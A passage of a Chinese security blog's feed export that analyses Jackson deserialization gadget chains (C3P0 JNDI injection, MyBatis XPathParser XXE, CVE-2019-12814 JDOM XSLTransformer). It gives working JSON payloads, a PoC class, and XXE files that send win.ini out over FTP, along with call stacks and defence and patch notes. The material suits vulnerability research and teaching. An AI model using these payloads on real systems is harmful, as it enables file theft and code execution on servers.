(com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, PoC</span><br></pre></td></tr></table></figure><h2 id="0x03-基于C3P0-JndiRefForwardingDataSource的利用链"><a href="#0x03-基于C3P0-JndiRefForwardingDataSource的利用链" class="headerlink" title="0x03 基于C3P0 JndiRefForwardingDataSource的利用链"></a>0x03 基于C3P0 JndiRefForwardingDataSource的利用链</h2><h3 id="复现利用-2"><a href="#复现利用-2" class="headerlink" title="复现利用"></a>复现利用</h3><p>需要开启RMI服务或LDAP服务，另外还需要c3p0-0.9.5.2，mchange-commons-java-0.2.15等jar包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\", &#123;\"jndiName\":\"ldap://localhost:1389/Exploit\", \"loginTimeout\":0&#125;]"</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/3.png" alt=""></p><h3 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h3><p>看到PoC中设置了两个属性值jndiName和loginTimeout。</p><p>我们调试的时候直接往com.mchange.v2.c3p0.JndiRefForwardingDataSource类的setLoginTimeout()及其父类JndiRefDataSourceBase.setJndiName()上打上断点。</p><p>前面的解析和反序列化过程跟之前的调试分析是一样的，调用deserializeAndSet()函数，再在其中调用<code>_setter.invoke()</code>实现反射调用目标类属性的setter方法。这里是先调用JndiRefDataSourceBase.setJndiName()设置jndiName属性值为我们的恶意LDAP服务地址：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/4.png" alt=""></p><p>往下调试，接着调用JndiRefForwardingDataSource.setLoginTimeout()函数设置loginTimeout属性值，可以看到先调用了inner()方法：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/5.png" alt=""></p><p>跟进inner()方法，由于inner并未有缓存即cachedInner为空，所以会往下执行调用dereference()函数：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/6.png" alt=""></p><p>在dereference()函数中，就是典型的JNDI注入漏洞了，其中lookup()函数的参数就是前面调用setJndiName()设置的属性值：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/7.png" alt=""></p><p>往下就是JNDI注入的过程了。</p><p>此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:2, Exploit</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:189, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:1085, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0)</span><br><span class="line">inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0)</span><br><span class="line">setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">deserializeAndSet:97, MethodProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, PoC</span><br></pre></td></tr></table></figure><h2 id="0x04-基于XPathParser的利用链"><a href="#0x04-基于XPathParser的利用链" class="headerlink" title="0x04 基于XPathParser的利用链"></a>0x04 基于XPathParser的利用链</h2><h3 id="复现利用-3"><a href="#复现利用-3" class="headerlink" title="复现利用"></a>复现利用</h3><p>需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p><p>和<a href="https://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%94CVE-2019-12814%EF%BC%88%E5%9F%BA%E4%BA%8EJDOM-XSLTransformer%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/">《Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）》</a>类似，只不过注入的XXE payload直接写在JSON数组中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"[\"org.apache.ibatis.parsing.XPathParser\", \"&lt;!DOCTYPE ANY[\\n&lt;!ENTITY % file SYSTEM 'file:///c:/windows/win.ini'&gt;\\n&lt;!ENTITY % remote SYSTEM 'http://127.0.0.1/xxe/evil.dtd'&gt;\\n%remote;\\n%send;\\n]&gt;\"]"</span>;</span><br></pre></td></tr></table></figure><p>evil.dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; %all;</span><br></pre></td></tr></table></figure><p>开启Web服务放置exp.xml和evil.dtd，再开启FTP服务进行监听接受数据：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/8.png" alt=""></p><h3 id="调试分析-3"><a href="#调试分析-3" class="headerlink" title="调试分析"></a>调试分析</h3><p>在调用newInstance()函数的时候，会新建一个XPathParser类对象，同时会调用该类的构造函数：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/9.png" alt=""></p><p>其中会调用createDocument()函数，其中直接调用DocumentBuilder.parse()而未调用setFeature()设置禁用的解析类型，并且参数是我们外部可控的XML内容，因此妥妥的XXE：</p><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/10.png" alt=""></p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">parse:339, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">createDocument:257, XPathParser (org.apache.ibatis.parsing)</span><br><span class="line">&lt;init&gt;:55, XPathParser (org.apache.ibatis.parsing)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, PoC</span><br></pre></td></tr></table></figure><h2 id="0x05-更多的一些Gadgets"><a href="#0x05-更多的一些Gadgets" class="headerlink" title="0x05 更多的一些Gadgets"></a>0x05 更多的一些Gadgets</h2><p>收集的一些利用链payload，具体环境和原理可自行搭建调试分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[&quot;org.springframework.context.support.GenericGroovyApplicationContext&quot;, &quot;http://127.0.0.1:8000/spel.xml&quot;]</span><br><span class="line">         </span><br><span class="line">[&quot;org.apache.openjpa.ee.RegistryManagedRuntime&quot;, &#123;&quot;registryName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, &quot;rollbackOnly&quot;: null&#125;]</span><br><span class="line"></span><br><span class="line">[&quot;org.apache.openjpa.ee.JNDIManagedRuntime&quot;, &#123;&quot;transactionManagerName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, &quot;rollbackOnly&quot;: null&#125;]</span><br><span class="line"></span><br><span class="line">[&quot;org.apache.axis2.transport.jms.JMSOutTransportInfo&quot;, &quot;jms:/ldap://localhost:1389/Exploit&quot;]</span><br><span class="line"></span><br><span class="line">[&quot;net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup&quot;, &#123;&quot;properties&quot;:&#123;&quot;jndiname&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;&#125;]</span><br><span class="line"></span><br><span class="line">[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;, &#123;&quot;jndiname&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;]</span><br></pre></td></tr></table></figure><h2 id="0x06-检测与防御"><a href="#0x06-检测与防御" class="headerlink" title="0x06 检测与防御"></a>0x06 检测与防御</h2><h3 id="检查方法"><a href="#检查方法" class="headerlink" title="检查方法"></a>检查方法</h3><p>检查是否使用到了Jackson，并且版本号是否是漏洞版本，若是则排查是否存在<code>ObjectMapper.readValue</code>，同时排查是否开启了DefaultTyping或使用了设置有问题的@JsonTypeInfo注解。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>升级到最新版的Jackson；</li><li>禁用enableDefaultTyping()；</li><li>禁用@JsonTypeInfo注解，或严格限制只能使用值为JsonTypeInfo.Id.NONE或JsonTypeInfo.Id.NAME的注解；</li><li>避免使用Object作为Jackson反序列化的类型；</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%94CVE-2019-12814%EF%BC%88%E5%9F%BA%E4%BA%8EJDOM-XSLTransformer%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/</id>
    <published>2019-11-24T09:08:45.000Z</published>
    <updated>2019-11-24T10:11:34.904Z</updated>
    
    <content type="html"><![CDATA[<p>该CVE其实是反序列化XXE导致的任意文件读取漏洞，这里简单复现分析下这条利用链。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.x系列 &lt;2.9.9.1</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>需要 JDOM 1.x 或 JDOM 2.x 的依赖支持。</p><h2 id="0x03-复现利用"><a href="#0x03-复现利用" class="headerlink" title="0x03 复现利用"></a>0x03 复现利用</h2><p>需要的jar：jackson-annotations-2.9.9，jackson-core-2.9.9，jackson-databind-2.9.9，jdom2-2.0.6。</p><p>关键PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"org.jdom2.transform.XSLTransformer"</span>, <span class="string">"http://127.0.0.1/exp.xml"</span>]</span><br></pre></td></tr></table></figure><p>完整Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        String payload = <span class="string">"[\"org.jdom2.transform.XSLTransformer\", \"http://127.0.0.1/exp.xml\"]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object object = mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着就是XXE的FTP外带数据的参数实体解析攻击了。</p><p>exp.xml：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/evil.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; %all;</span><br></pre></td></tr></table></figure><p>开启Web服务放置exp.xml和evil.dtd，再开启FTP服务进行监听接受数据。</p><p>运行，FTP服务端即可接收到目标文件内容：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/1.png" alt=""></p><h2 id="0x04-调试分析"><a href="#0x04-调试分析" class="headerlink" title="0x04 调试分析"></a>0x04 调试分析</h2><p>前面的解析过程和之前分析的反序列化过程几乎是一样的，我们直接在newInstance()新建的实例中看到，调用到XSLTransformer类的构造函数，其中调用了newTemplates()方法来新建模板：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/2.png" alt=""></p><p>跟进newTemplates()方法，其中调用了XSLTC.compile()方法对输入参数内容进行解析：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/3.png" alt=""></p><p>跟下去，发现调用parse()函数来解析根节点的抽象语法树：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/4.png" alt=""></p><p>再跟进去看看，就是调用Parser.parse()解析XML，且调用的setFeature()设置的并不是XXE的有效防御设置，导致XXE漏洞的存在：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/5.png" alt=""></p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/6.png" alt=""></p><p>再往下，就是调用SAXParser.parse()函数来解析该XML内容了，就是XXE的触发的地方。</p><p>值得一提的是，OWASP推荐的防御XXE的setFeature()要设置下面几个值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">factory.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>很明显看到，前面漏洞代码中setFeature()设置的并非前面的防御设置，因此并不能防御XXE：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NAMESPACE_FEATURE =    <span class="string">"http://xml.org/sax/features/namespaces"</span>;</span><br></pre></td></tr></table></figure><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>Jackson在2.9.9.1版本中添加了该JDOM类的黑名单，具体的可在jackson-databind-2.9.9.1-sources.jar!/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java中看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [databind#2341]: jdom/jdom2 (2.9.9.1)</span></span><br><span class="line">s.add(<span class="string">"org.jdom.transform.XSLTransformer"</span>);</span><br><span class="line">s.add(<span class="string">"org.jdom2.transform.XSLTransformer"</span>);</span><br></pre></td></tr></table></figure><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://bithack.io/forum/463" target="_blank" rel="noopener">Java 反序列化漏洞始末（4）— jackson</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>个人Wiki系统</title>
    <link href="https://www.mi1k7ea.com/2019/11/22/home/"/>
    <id>https://www.mi1k7ea.com/2019/11/22/home/</id>
    <published>2019-11-22T13:32:01.396Z</published>
    <updated>2019-12-15T03:00:17.321Z</updated>
    
    <content type="html"><![CDATA[<hr><pre> __  __ _ _ _    _____          _      __        ___ _    _ |  \/  (_) | | _|___  |__  __ _( )___  \ \      / (_) | _(_)| |\/| | | | |/ /  / / _ \/ _` |// __|  \ \ /\ / /| | |/ / || |  | | | |   <  / /  __/ (_| | \__ \   \ V  V / | |   <| |<br="">|_|  |_|_|_|_|\_\/_/ \___|\__,_| |___/    \_/\_/  |_|_|\_\_|</|></pre><hr><p><strong>Email：</strong>6d69316b376561403136332e636f6d</p><hr><p><strong>Note：</strong>本站改为个人Wiki系统，将之前写的博客、知识笔记都系统归纳起来，同时会转载一些网上的总结笔记，目的在于构建知识库、以便于个人的查阅。</p><hr><p><strong>关于Wiki：</strong>改自Hexo Book主题，<a href="https://github.com/kaiiiz/hexo-theme-book" target="_blank" rel="noopener">主题地址</a>。</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;pre&gt;
 __  __ _ _ _    _____          _      __        ___ _    _ 
|  \/  (_) | | _|___  |__  __ _( )___  \ \      / (_) | _(_)
| |\/| 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://www.mi1k7ea.com/2019/11/22/menu/"/>
    <id>https://www.mi1k7ea.com/2019/11/22/menu/</id>
    <published>2019-11-22T13:30:57.172Z</published>
    <updated>2020-02-09T14:10:51.849Z</updated>
    
    <content type="html"><![CDATA[<p>Good Good Study</p><ul><li><strong><a href="/archives">归档</a></strong></li></ul><hr><ul><li><strong>Web安全</strong><ul><li>Web安全基础&amp;Tricks<ul><li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li><li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li><li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li><li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li><li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li><li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li><li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li><li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li><li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li><li><a href="/2020/01/21/CSRF-Tricks小结/">CSRF Tricks小结</a></li><li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li><li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li><li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li><li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li><li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li><li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li><li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li><li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li><li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li><li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li><li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li><li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li><li><a href="/2020/01/26/浅析XSSJacking/">浅析XSSJacking</a></li><li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li><li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li><li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li></ul></li><li>Web安全之机器学习</li><li>WriteUp Web<ul><li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li><li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li><li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li><li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li><li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li><li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li><li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li><li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li><li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li><li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li><li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li><li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li><li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li><li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li><li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li></ul></li></ul></li><li><strong>Java</strong><ul><li>Java安全<ul><li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li><li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li><li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li><li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li><li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li><li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li><li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li><li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li><li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li><li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li><li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li><li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li><li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li><li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li><li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li><li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li><li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li><li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li><li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li><li><a href="/2020/01/25/Java-Hessian反序列化漏洞/">Java Hessian反序列化漏洞</a></li><li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li><li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li><li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li><li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li><li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li><li><a 